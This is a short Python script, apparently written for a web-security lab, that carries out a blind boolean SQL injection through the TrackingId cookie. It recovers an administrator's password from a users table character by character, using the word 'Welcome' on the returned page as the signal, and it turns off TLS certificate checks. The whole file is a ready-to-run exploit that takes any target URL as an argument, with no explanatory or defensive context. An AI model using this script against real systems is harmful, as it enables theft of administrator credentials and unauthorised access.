import sys
import requests
import urllib3
import urllib

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

def main():
   url = sys.argv[1]
   TrackingId = sys.argv[2]
   session = sys.argv[3]
   print("In progress...")
   pword = ""
   for i in range(1,21):
       for j in range(32,126):
        payload ="' and (SELECT ascii(substring(password,%s,1)) from users where username = 'administrator')='%s'--"%(i,j)
        payload_encoded = urllib.parse.quote(payload)
        cookies = {'TrackingId': TrackingId + payload_encoded, 'session': session}
       # r=requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        r=requests.get(url, cookies=cookies, verify=False)
        if "Welcome" not in r.text:
                sys.stdout.write('\r' + pword + chr(j))
                sys.stdout.flush()
        else:
            pword += chr(j)
            sys.stdout.write('\r' + pword)
            sys.stdout.flush()
            break

if __name__ == "__main__":
    main()
